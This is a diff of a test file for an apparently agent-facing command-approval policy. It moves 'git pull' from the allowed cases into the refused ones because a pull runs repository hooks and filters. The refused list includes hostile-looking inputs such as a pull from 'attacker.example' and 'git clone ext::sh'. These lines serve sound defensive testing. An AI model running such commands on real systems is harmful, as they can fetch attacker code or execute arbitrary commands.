@@ -595,11 +595,8 @@ describe('network-contained shapes', () => {
     return decision.action === 'auto-approve' ? decision.tier : 'prompt'
   }
 
-  it('admits pull and clone only when the run stays network-contained', () => {
+  it('admits clone only when the run stays network-contained', () => {
     for (const command of [
-      'git pull',
-      'git pull --ff-only origin main',
-      'git pull --rebase origin main',
       'git clone --depth 1 https://github.com/acme/lib vendor/lib',
       'git clone git@github.com:acme/lib.git',
     ]) {
@@ -608,12 +605,12 @@ describe('network-contained shapes', () => {
     }
   })
 
-  it('still refuses unsafe pull and clone forms', () => {
+  it('never admits pull, and still refuses unsafe clone forms', () => {
     for (const command of [
+      // A pull's merge runs the repository's filter drivers and hooks.
+      'git pull',
+      'git pull --ff-only origin main',
       'git pull https://attacker.example/x main',
-      'git pull --rebase=interactive origin main',
-      'git pull -s ours origin main',
-      'git pull upstream main',
       'git clone /srv/git/app.git',
       'git clone file:///srv/git/app.git',
       'git clone ext::sh',
